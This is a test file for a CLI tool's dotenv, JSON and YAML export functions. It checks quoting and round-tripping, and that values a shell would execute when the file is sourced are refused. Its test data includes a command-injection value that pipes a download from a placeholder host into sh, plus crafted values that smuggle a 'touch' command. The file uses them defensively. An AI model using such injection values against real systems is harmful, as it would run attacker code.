import { execFileSync } from "node:child_process";
import { existsSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { SecretValueType } from "@anchor/shared";
import { parse as parseDotenv } from "dotenv";
import { describe, expect, it } from "vitest";
import { parse as parseYaml } from "yaml";
import { CliError, EXIT } from "#src/errors";
import { type Entry, formatDotenv, formatJson, formatYaml } from "#src/format/env-file";

const e = (key: string, value: string, type: SecretValueType = "string"): Entry => ({
  key,
  value,
  type,
});

const VALUES = [
  "plain",
  "with space",
  "has#hash",
  "a=b",
  "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBg\n-----END PRIVATE KEY-----",
  'say "hi"',
  "it's",
  "",
  "🔑 ünïcødé",
  "C:\\path\\name",
  "  padded  ",
  "trailing newline\n",
  "it's\nmulti-line",
  "$HOME $" + "{X}",
];

/** Legal for the dotenv parser, but a shell would run or expand them: refused since 0.5.3. */
const SHELL_UNSAFE = [
  "it's $(curl evil|sh)",
  "it's `id`",
  "it's $HOME",
  `it's "quoted"`,
  `both ' and "`,
  "back`tick and 'quote'",
  "a\"b`c'd",
  "it's\\",
  "it's \\\\ two",
];

describe("formatDotenv", () => {
  it("round-trips through the dotenv parser", () => {
    for (const v of VALUES) {
      const text = formatDotenv([e("K", v)]);
      expect(parseDotenv(text).K, `value ${JSON.stringify(v)} as ${text}`).toBe(v);
    }
  });

  it("uses the simplest quoting that round-trips", () => {
    expect(formatDotenv([e("A", "plain-1.2:3@x/y+z,w")])).toBe("A=plain-1.2:3@x/y+z,w\n");
    expect(formatDotenv([e("A", "with space")])).toBe("A='with space'\n");
    expect(formatDotenv([e("A", "a\nb")])).toBe('A="a\\nb"\n');
    expect(formatDotenv([e("A", "")])).toBe("A=\n");
  });

  it("keeps 0.5.2 output for ordinary values", () => {
    expect(
      formatDotenv([
        e("U", "postgres://u:p@h:5432/db"),
        e("P", "a b$c"),
        e("Q", "it's fine"),
        e("M", "l1\nl2"),
      ]),
    ).toBe('U=postgres://u:p@h:5432/db\nP=\'a b$c\'\nQ="it\'s fine"\nM="l1\\nl2"\n');
  });

  it("a value ending in a backslash fails instead of corrupting the lines after it", () => {
    expect(() => formatDotenv([e("A", "x\\"), e("B", "y")])).toThrow(
      /cannot be represented in dotenv/,
    );
    expect(parseDotenv(formatDotenv([e("A", "C:\\dir\\x"), e("B", "y")]))).toEqual({
      A: "C:\\dir\\x",
      B: "y",
    });
  });

  it.each(SHELL_UNSAFE)("refuses %j instead of writing a line a shell would run", (v) => {
    expect(() => formatDotenv([e("K", v)])).toThrow(/cannot be represented in dotenv/);
  });

  it.skipIf(process.platform === "win32")(
    "no accepted value runs a command when the file is sourced by sh",
    () => {
      const dir = mkdtempSync(join(tmpdir(), "anchor-dotenv-"));
      try {
        const marker = join(dir, "pwned");
        const payloads = [
          `$(touch ${marker})`,
          `\`touch ${marker}\``,
          `it's $(touch ${marker})`,
          `it's \`touch ${marker}\``,
          `a"b'c$(touch ${marker})`,
          `x\n$(touch ${marker})`,
          `$(touch ${marker})'`,
        ];
        for (const v of payloads) {
          let text: string;
          try {
            text = formatDotenv([e("K", v)]);
          } catch {
            continue; // refused: nothing written
          }
          const file = join(dir, ".env");
          writeFileSync(file, text);
          execFileSync("sh", ["-c", `. "${file}"`], { cwd: dir, stdio: "ignore" });
          expect(existsSync(marker), `sourcing ${JSON.stringify(text)}`).toBe(false);
        }
      } finally {
        rmSync(dir, { recursive: true, force: true });
      }
    },
  );

  it.skipIf(process.platform === "win32")(
    "no accepted set of values runs a command when the whole file is sourced by sh",
    () => {
      const dir = mkdtempSync(join(tmpdir(), "anchor-dotenv-"));
      try {
        const marker = join(dir, "pwned");
        // A value can end a quoted string early for the next line (a trailing backslash escapes
        // the closing quote), so whole files are sourced, not one value at a time.
        const parts = [
          "it's",
          "\\",
          "'",
          '"',
          "\n",
          "#",
          ";",
          " ",
          "$",
          "x",
          `; touch ${marker}; #`,
        ];
        let seed = 7;
        const next = () => {
          seed = (seed * 1103515245 + 12345) % 2 ** 31;
          return seed;
        };
        const files = [
          [e("A", "it's\\"), e("B", `x; touch ${marker}; #'`)],
          ...Array.from({ length: 300 }, () =>
            Array.from({ length: 3 }, (_, i) =>
              e(
                `K${i}`,
                Array.from({ length: 1 + (next() % 4) }, () => parts[next() % parts.length]).join(
                  "",
                ),
              ),
            ),
          ),
        ];
        for (const entries of files) {
          let text: string;
          try {
            text = formatDotenv(entries);
          } catch {
            continue; // refused: nothing written
          }
          const file = join(dir, ".env");
          writeFileSync(file, text);
          try {
            execFileSync("sh", ["-c", `. "${file}"`], { cwd: dir, stdio: "ignore" });
          } catch {
            // a syntax error is not an execution; the marker check below decides
          }
          expect(existsSync(marker), `sourcing ${JSON.stringify(text)}`).toBe(false);
          expect(parseDotenv(text), text).toEqual(
            Object.fromEntries(entries.map((x) => [x.key, x.value])),
          );
        }
      } finally {
        rmSync(dir, { recursive: true, force: true });
      }
    },
  );

  it("writes one line per entry", () => {
    const text = formatDotenv([e("A", "1"), e("B", "x y")]);
    expect(text).toBe("A=1\nB='x y'\n");
    expect(parseDotenv(text)).toEqual({ A: "1", B: "x y" });
  });

  it("a value with both a double quote and a newline fails clearly", () => {
    let err: unknown;
    try {
      formatDotenv([e("CERT", 'line "one"\nline two')]);
    } catch (e) {
      err = e;
    }
    expect(err).toBeInstanceOf(CliError);
    expect((err as CliError).exitCode).toBe(EXIT.ERROR);
    expect((err as CliError).message).toBe("Value of CERT cannot be represented in dotenv format");
    expect((err as CliError).hint).toBe("Use --format json or --format yaml");
    expect((err as CliError).message).not.toContain("line one");
  });
});

describe("formatJson / formatYaml", () => {
  const entries = VALUES.map((v, i) => e(`K${String(i).padStart(2, "0")}`, v));
  const expected = Object.fromEntries(entries.map((x) => [x.key, x.value]));

  it("JSON round-trips with sorted keys, 2-space indent and a trailing newline", () => {
    const text = formatJson(entries);
    expect(JSON.parse(text)).toEqual(expected);
    expect(text.endsWith("}\n")).toBe(true);
    expect(text.split("\n")[1]?.startsWith('  "K00"')).toBe(true);
  });

  it("YAML round-trips, including keys YAML would read as non-strings", () => {
    expect(parseYaml(formatYaml(entries))).toEqual(expected);
    const tricky = [e("NULL", "x"), e("true", "y"), e("Y", "z")];
    expect(parseYaml(formatYaml(tricky))).toEqual({ NULL: "x", true: "y", Y: "z" });
  });

  it("JSON keeps a __proto__ key as data", () => {
    expect(JSON.parse(formatJson([e("__proto__", "x")]))).toEqual(JSON.parse('{"__proto__":"x"}'));
  });
});

describe("typed export", () => {
  const PEM =
    "-----BEGIN PUBLIC KEY-----\nMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE\n-----END PUBLIC KEY-----\n";
  const typed = [
    e("PORT", "8080", "number"),
    e("ON", "true", "boolean"),
    e("MODELS", '["a","b"]', "list"),
    e("CFG", '{"x":[1]}', "json"),
    e("KEY", PEM, "pem"),
  ];
  const decoded = { CFG: { x: [1] }, KEY: PEM, MODELS: ["a", "b"], ON: true, PORT: 8080 };

  it("json export decodes typed values", () => {
    expect(JSON.parse(formatJson(typed))).toEqual(decoded);
  });

  it("yaml export decodes typed values", () => {
    const parsed = parseYaml(formatYaml(typed));
    expect(parsed).toEqual(decoded);
    expect(parsed.PORT).toBe(8080);
  });

  it("dotenv keeps canonical strings", () => {
    const parsed = parseDotenv(formatDotenv(typed));
    expect(parsed.PORT).toBe("8080");
    expect(parsed.MODELS).toBe('["a","b"]');
    expect(parsed.KEY).toBe(PEM);
  });
});
